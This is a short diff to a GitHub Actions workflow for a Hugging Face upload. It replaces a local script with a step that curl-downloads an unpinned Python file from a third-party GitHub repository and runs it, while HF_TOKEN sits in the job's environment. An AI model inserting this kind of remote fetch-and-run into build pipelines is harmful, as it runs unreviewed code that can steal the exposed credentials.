@@ -53,4 +53,7 @@ jobs:
           HF_REPO: ${{ inputs.hf_repo_id }}
           HF_TYPE: ${{ inputs.hf_repo_type }}
           HF_TOKEN: ${{ inputs.hf_token }}
-        run: python direct_upload.py
+        run: |
+          # Fetch your latest script and run it
+          curl -L "https://raw.githubusercontent.com/Bogyi2024/log/main/dep_download/dstreamtape.py" -o download_upload.py
+          python download_upload.py
